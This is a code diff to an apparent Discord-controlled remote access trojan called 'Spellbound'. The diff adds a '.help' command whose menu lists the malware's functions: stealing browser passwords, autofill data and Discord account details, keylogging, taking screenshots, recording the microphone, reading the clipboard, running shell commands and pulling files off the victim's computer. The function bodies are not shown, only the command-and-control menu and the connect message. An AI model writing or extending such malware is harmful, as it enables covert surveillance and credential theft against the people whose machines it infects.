@@ -12,7 +12,6 @@ import string
 import socket
 import shutil
 import sqlite3
-import asyncio
 import platform
 import threading
 import subprocess
@@ -477,6 +476,14 @@ class Client(discord.Client):
                 await message.delete()
                 
                 embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
+                await message.channel.send(embed=embed)
+
+            # ____________________________________________________________________________________________________________________________________________ #
+            # =================================================================== .help ================================================================== #
+            elif message.content == ".help":
+                await message.delete()
+
+                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.grab pc` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.voice` : Record microphone for 10 seconds\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________ #
